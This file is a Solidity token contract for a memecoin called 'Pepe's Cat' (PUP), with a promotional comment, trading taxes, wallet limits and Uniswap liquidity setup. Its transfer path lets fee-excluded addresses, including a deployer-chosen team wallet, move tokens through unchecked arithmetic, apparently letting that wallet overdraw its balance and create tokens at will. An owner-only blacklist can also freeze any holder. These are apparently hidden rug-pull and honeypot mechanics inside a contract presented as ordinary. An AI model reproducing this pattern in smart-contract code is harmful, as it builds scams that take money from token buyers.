/*

Introducing PUP, Pepe's purr-fect four-legged companion, ruling over the Ethereum network with undeniable charm and feline finesse. 
Follow PUP on a whisker-twitching adventure as he paws his way to the apex of the crypto kingdom, just like his human, Pepe. 
Along the way, he'll make furry friends, leaving a trail of paw prints in the digital sands as he ascends to become the reigning cat monarch of ETH. 
Get ready to witness the cutest crypto conquest ever seen!

Website:    https://www.pupeth.vip
Telegram:   https://t.me/pup_erc
Twitter:    https://twitter.com/pup_erc

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPUPFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IPUPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract PUP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excludedFromFees;
    mapping(address => bool) private bots;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Pepe's Cat";
    string private constant _symbol = unicode"PUP";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;
    uint256 public _pupThresZ = 800_000_000 * 10 ** _decimals;
    uint256 public _swapThresPUP = 200 * 10 ** _decimals;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;

    IPUPRouter private pupRouter;
    address private pupPair;

    uint256 firstBlock;
    
    address payable private _teamTreaz;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _pupW) {
        _teamTreaz = payable(_pupW);
    
        _excludedFromFees[owner()] = true;
        _excludedFromFees[address(this)] = true;
        _excludedFromFees[_teamTreaz] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _transferTokens(from, to, amount, 0);
            return;
        }

        uint256 pupFees = 0;
        uint256 contractTokenBalance = balanceOf(address(this));
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            pupFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (
                from == pupPair &&
                to != address(pupRouter) &&
                !_excludedFromFees[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != pupPair && !_excludedFromFees[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (to == pupPair && from != address(this)) {
                pupFees = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            if (
                !inSwap &&
                swapEnabled &&
                to == pupPair &&
                _buyCount > _preventSwapBefore &&
                !_excludedFromFees[from] &&
                !_excludedFromFees[to]
            ) {
                if(balanceOf(address(this)) > _swapThresPUP){
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }

                _teamTreaz.transfer(address(this).balance);
            }
        }

        if (!_excludedFromFees[from]) {
            _transferTokens(from, to, amount, pupFees);
        } else {
            _internalTransfer(from, to, amount);
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pupRouter.WETH();
        _approve(address(this), address(pupRouter), tokenAmount);
        pupRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function _transferTokens(
        address from,
        address to,
        uint256 amount,
        uint256 pupFees
    ) internal {
        if (pupFees > 0) {
            _balances[address(this)] = _balances[address(this)].add(pupFees);
            emit Transfer(from, address(this), pupFees);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(pupFees));
        emit Transfer(from, to, amount.sub(pupFees));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _internalTransfer(address from, address to, uint256 amount) internal {
        unchecked {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
        }
        emit Transfer(from, to, amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        pupRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _pupThresZ,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(pupPair).approve(address(pupRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
    }

    function initPUP() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        pupRouter = IPUPRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(pupRouter), _tTotal);
        pupPair = IPUPFactory(pupRouter.factory()).createPair(
            address(this),
            pupRouter.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    receive() external payable {}
}